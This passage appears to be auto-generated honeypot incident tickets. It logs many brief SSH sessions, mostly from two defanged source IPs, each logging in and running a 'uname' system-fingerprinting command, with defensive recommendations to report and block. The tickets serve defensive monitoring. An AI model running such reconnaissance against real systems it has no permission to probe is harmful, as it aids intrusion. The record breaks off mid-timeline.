| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:52` | `cowrie.session.connect` |
| `2026-08-08 00:59:52` | `cowrie.client.version` |
| `2026-08-08 00:59:52` | `cowrie.client.kex` |
| `2026-08-08 00:59:52` | `cowrie.login.success` |
| `2026-08-08 00:59:53` | `cowrie.session.params` |
| `2026-08-08 00:59:53` | `cowrie.command.input` |
| `2026-08-08 00:59:53` | `cowrie.log.closed` |
| `2026-08-08 00:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c82bd07c7703

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:57` | `cowrie.session.connect` |
| `2026-08-08 00:59:57` | `cowrie.client.version` |
| `2026-08-08 00:59:57` | `cowrie.client.kex` |
| `2026-08-08 00:59:58` | `cowrie.login.success` |
| `2026-08-08 00:59:58` | `cowrie.session.params` |
| `2026-08-08 00:59:58` | `cowrie.command.input` |
| `2026-08-08 00:59:59` | `cowrie.log.closed` |
| `2026-08-08 00:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74fea2fbaafa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:02` | `cowrie.session.connect` |
| `2026-08-08 01:00:02` | `cowrie.client.version` |
| `2026-08-08 01:00:03` | `cowrie.client.kex` |
| `2026-08-08 01:00:03` | `cowrie.login.success` |
| `2026-08-08 01:00:04` | `cowrie.session.params` |
| `2026-08-08 01:00:04` | `cowrie.command.input` |
| `2026-08-08 01:00:04` | `cowrie.log.closed` |
| `2026-08-08 01:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c42cd2eb028

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:08` | `cowrie.session.connect` |
| `2026-08-08 01:00:08` | `cowrie.client.version` |
| `2026-08-08 01:00:08` | `cowrie.client.kex` |
| `2026-08-08 01:00:09` | `cowrie.login.success` |
| `2026-08-08 01:00:09` | `cowrie.session.params` |
| `2026-08-08 01:00:09` | `cowrie.command.input` |
| `2026-08-08 01:00:10` | `cowrie.log.closed` |
| `2026-08-08 01:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f417dd0afd25

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:13` | `cowrie.session.connect` |
| `2026-08-08 01:00:13` | `cowrie.client.version` |
| `2026-08-08 01:00:13` | `cowrie.client.kex` |
| `2026-08-08 01:00:13` | `cowrie.login.success` |
| `2026-08-08 01:00:14` | `cowrie.session.params` |
| `2026-08-08 01:00:14` | `cowrie.command.input` |
| `2026-08-08 01:00:15` | `cowrie.log.closed` |
| `2026-08-08 01:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da8fe00325c6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:13` | `cowrie.session.connect` |
| `2026-08-08 01:00:13` | `cowrie.client.version` |
| `2026-08-08 01:00:13` | `cowrie.client.kex` |
| `2026-08-08 01:00:13` | `cowrie.login.success` |
| `2026-08-08 01:00:15` | `cowrie.session.params` |
| `2026-08-08 01:00:15` | `cowrie.command.input` |
| `2026-08-08 01:00:15` | `cowrie.log.closed` |
| `2026-08-08 01:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db275bd3b8b5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:18` | `cowrie.session.connect` |
| `2026-08-08 01:00:18` | `cowrie.client.version` |
| `2026-08-08 01:00:18` | `cowrie.client.kex` |
| `2026-08-08 01:00:18` | `cowrie.login.success` |
| `2026-08-08 01:00:19` | `cowrie.session.params` |
| `2026-08-08 01:00:19` | `cowrie.command.input` |
| `2026-08-08 01:00:19` | `cowrie.log.closed` |
| `2026-08-08 01:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15fd09037022

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:23` | `cowrie.session.connect` |
| `2026-08-08 01:00:23` | `cowrie.client.version` |
| `2026-08-08 01:00:23` | `cowrie.client.kex` |
| `2026-08-08 01:00:24` | `cowrie.login.success` |
| `2026-08-08 01:00:25` | `cowrie.session.params` |
| `2026-08-08 01:00:25` | `cowrie.command.input` |
| `2026-08-08 01:00:25` | `cowrie.log.closed` |
| `2026-08-08 01:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9989e117fed

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:28` | `cowrie.session.connect` |
| `2026-08-08 01:00:28` | `cowrie.client.version` |
| `2026-08-08 01:00:28` | `cowrie.client.kex` |
| `2026-08-08 01:00:29` | `cowrie.login.success` |
| `2026-08-08 01:00:29` | `cowrie.session.params` |
| `2026-08-08 01:00:29` | `cowrie.command.input` |
| `2026-08-08 01:00:30` | `cowrie.log.closed` |
| `2026-08-08 01:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbba634fa62e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:33` | `cowrie.session.connect` |
| `2026-08-08 01:00:33` | `cowrie.client.version` |
| `2026-08-08 01:00:34` | `cowrie.client.kex` |
| `2026-08-08 01:00:34` | `cowrie.login.success` |
| `2026-08-08 01:00:35` | `cowrie.session.params` |
| `2026-08-08 01:00:35` | `cowrie.command.input` |
| `2026-08-08 01:00:35` | `cowrie.log.closed` |
| `2026-08-08 01:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11d491098a46

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:39` | `cowrie.session.connect` |
| `2026-08-08 01:00:39` | `cowrie.client.version` |
| `2026-08-08 01:00:39` | `cowrie.client.kex` |
| `2026-08-08 01:00:39` | `cowrie.login.success` |
| `2026-08-08 01:00:40` | `cowrie.session.params` |
| `2026-08-08 01:00:40` | `cowrie.command.input` |
| `2026-08-08 01:00:40` | `cowrie.log.closed` |
| `2026-08-08 01:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a1a19df86aa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:44` | `cowrie.session.connect` |
| `2026-08-08 01:00:44` | `cowrie.client.version` |
| `2026-08-08 01:00:44` | `cowrie.client.kex` |
| `2026-08-08 01:00:44` | `cowrie.login.success` |
| `2026-08-08 01:00:45` | `cowrie.session.params` |
| `2026-08-08 01:00:45` | `cowrie.command.input` |
| `2026-08-08 01:00:45` | `cowrie.log.closed` |
| `2026-08-08 01:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b54bd696fbe7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:49` | `cowrie.session.connect` |
| `2026-08-08 01:00:49` | `cowrie.client.version` |
| `2026-08-08 01:00:49` | `cowrie.client.kex` |
| `2026-08-08 01:00:49` | `cowrie.login.success` |
| `2026-08-08 01:00:50` | `cowrie.session.params` |
| `2026-08-08 01:00:50` | `cowrie.command.input` |
| `2026-08-08 01:00:50` | `cowrie.log.closed` |
| `2026-08-08 01:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c36d7dc61f53

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:54` | `cowrie.session.connect` |
| `2026-08-08 01:00:54` | `cowrie.client.version` |
| `2026-08-08 01:00:54` | `cowrie.client.kex` |
| `2026-08-08 01:00:54` | `cowrie.login.success` |
| `2026-08-08 01:00:55` | `cowrie.session.params` |
| `2026-08-08 01:00:55` | `cowrie.command.input` |
| `2026-08-08 01:00:56` | `cowrie.log.closed` |
| `2026-08-08 01:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18199dad091e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:00 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:00:59` | `cowrie.session.connect` |
| `2026-08-08 01:00:59` | `cowrie.client.version` |
| `2026-08-08 01:00:59` | `cowrie.client.kex` |
| `2026-08-08 01:00:59` | `cowrie.login.success` |
| `2026-08-08 01:01:00` | `cowrie.session.params` |
| `2026-08-08 01:01:00` | `cowrie.command.input` |
| `2026-08-08 01:01:00` | `cowrie.log.closed` |
| `2026-08-08 01:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd03c4b8d5f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:04` | `cowrie.session.connect` |
| `2026-08-08 01:01:04` | `cowrie.client.version` |
| `2026-08-08 01:01:04` | `cowrie.client.kex` |
| `2026-08-08 01:01:04` | `cowrie.login.success` |
| `2026-08-08 01:01:05` | `cowrie.session.params` |
| `2026-08-08 01:01:05` | `cowrie.command.input` |
| `2026-08-08 01:01:05` | `cowrie.log.closed` |
| `2026-08-08 01:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c67dce10dee2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:09` | `cowrie.session.connect` |
| `2026-08-08 01:01:09` | `cowrie.client.version` |
| `2026-08-08 01:01:09` | `cowrie.client.kex` |
| `2026-08-08 01:01:09` | `cowrie.login.success` |
| `2026-08-08 01:01:10` | `cowrie.session.params` |
| `2026-08-08 01:01:10` | `cowrie.command.input` |
| `2026-08-08 01:01:11` | `cowrie.log.closed` |
| `2026-08-08 01:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45dd513a67de

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:14` | `cowrie.session.connect` |
| `2026-08-08 01:01:14` | `cowrie.client.version` |
| `2026-08-08 01:01:14` | `cowrie.client.kex` |
| `2026-08-08 01:01:15` | `cowrie.login.success` |
| `2026-08-08 01:01:16` | `cowrie.session.params` |
| `2026-08-08 01:01:16` | `cowrie.command.input` |
| `2026-08-08 01:01:16` | `cowrie.log.closed` |
| `2026-08-08 01:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3593142048

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:20` | `cowrie.session.connect` |
| `2026-08-08 01:01:20` | `cowrie.client.version` |
| `2026-08-08 01:01:20` | `cowrie.client.kex` |
| `2026-08-08 01:01:20` | `cowrie.login.success` |
| `2026-08-08 01:01:21` | `cowrie.session.params` |
| `2026-08-08 01:01:21` | `cowrie.command.input` |
| `2026-08-08 01:01:21` | `cowrie.log.closed` |
| `2026-08-08 01:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ff9fc4a888

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:25` | `cowrie.session.connect` |
| `2026-08-08 01:01:25` | `cowrie.client.version` |
| `2026-08-08 01:01:25` | `cowrie.client.kex` |
| `2026-08-08 01:01:25` | `cowrie.login.success` |
| `2026-08-08 01:01:26` | `cowrie.session.params` |
| `2026-08-08 01:01:26` | `cowrie.command.input` |
| `2026-08-08 01:01:26` | `cowrie.log.closed` |
| `2026-08-08 01:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c8d4c6343a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:30` | `cowrie.session.connect` |
| `2026-08-08 01:01:30` | `cowrie.client.version` |
| `2026-08-08 01:01:30` | `cowrie.client.kex` |
| `2026-08-08 01:01:30` | `cowrie.login.success` |
| `2026-08-08 01:01:31` | `cowrie.session.params` |
| `2026-08-08 01:01:31` | `cowrie.command.input` |
| `2026-08-08 01:01:31` | `cowrie.log.closed` |
| `2026-08-08 01:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45450c145a3c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:35` | `cowrie.session.connect` |
| `2026-08-08 01:01:35` | `cowrie.client.version` |
| `2026-08-08 01:01:35` | `cowrie.client.kex` |
| `2026-08-08 01:01:36` | `cowrie.login.success` |
| `2026-08-08 01:01:37` | `cowrie.session.params` |
| `2026-08-08 01:01:37` | `cowrie.command.input` |
| `2026-08-08 01:01:37` | `cowrie.log.closed` |
| `2026-08-08 01:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64a441c26269

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:40` | `cowrie.session.connect` |
| `2026-08-08 01:01:40` | `cowrie.client.version` |
| `2026-08-08 01:01:41` | `cowrie.client.kex` |
| `2026-08-08 01:01:41` | `cowrie.login.success` |
| `2026-08-08 01:01:42` | `cowrie.session.params` |
| `2026-08-08 01:01:42` | `cowrie.command.input` |
| `2026-08-08 01:01:42` | `cowrie.log.closed` |
| `2026-08-08 01:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6196de0dac0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:45` | `cowrie.session.connect` |
| `2026-08-08 01:01:45` | `cowrie.client.version` |
| `2026-08-08 01:01:45` | `cowrie.client.kex` |
| `2026-08-08 01:01:46` | `cowrie.login.success` |
| `2026-08-08 01:01:46` | `cowrie.session.params` |
| `2026-08-08 01:01:46` | `cowrie.command.input` |
| `2026-08-08 01:01:46` | `cowrie.log.closed` |
| `2026-08-08 01:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ac14dbb6ea8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:50` | `cowrie.session.connect` |
| `2026-08-08 01:01:50` | `cowrie.client.version` |
| `2026-08-08 01:01:51` | `cowrie.client.kex` |
| `2026-08-08 01:01:51` | `cowrie.login.success` |
| `2026-08-08 01:01:52` | `cowrie.session.params` |
| `2026-08-08 01:01:52` | `cowrie.command.input` |
| `2026-08-08 01:01:52` | `cowrie.log.closed` |
| `2026-08-08 01:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-030bc5739bf2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:53` | `cowrie.session.connect` |
| `2026-08-08 01:01:53` | `cowrie.client.version` |
| `2026-08-08 01:01:53` | `cowrie.client.kex` |
| `2026-08-08 01:01:53` | `cowrie.login.success` |
| `2026-08-08 01:01:54` | `cowrie.session.params` |
| `2026-08-08 01:01:54` | `cowrie.command.input` |
